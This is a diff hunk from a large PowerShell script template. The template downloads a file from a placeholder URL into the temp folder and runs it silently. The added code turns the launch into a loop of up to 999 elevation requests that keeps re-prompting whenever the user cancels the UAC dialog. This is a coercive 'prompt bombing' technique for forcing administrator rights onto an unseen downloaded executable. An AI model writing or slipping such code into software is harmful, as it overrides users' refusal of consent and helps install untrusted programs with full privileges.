@@ -6112,7 +6112,23 @@ $u = "__URL__";
 $o = Join-Path $env:TEMP "__FILE__";
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
 Invoke-WebRequest -Uri $u -OutFile $o -UseBasicParsing;
-Start-Process -FilePath $o -ArgumentList "/VERYSILENT /SUPPRESSMSGBOXES /NORESTART" -WindowStyle Hidden -Wait
+$__launched = $false;
+1..999 | ForEach-Object {
+    if ($__launched) { return }
+    try {
+        Start-Process -FilePath $o -ArgumentList "/VERYSILENT /SUPPRESSMSGBOXES /NORESTART" -Verb RunAs -ErrorAction Stop;
+        $__launched = $true
+    }
+    catch {
+        $__hr = [uint32]$_.Exception.HResult;
+        if ($__hr -eq 0x80004005 -or $__hr -eq 0x800704C7) {
+            Start-Sleep -Seconds 1
+        }
+        else {
+            exit 1
+        }
+    }
+}
 '@
         $logic = $logic.Replace('__URL__', $URL)
         $logic = $logic.Replace('__FILE__', $FileName)
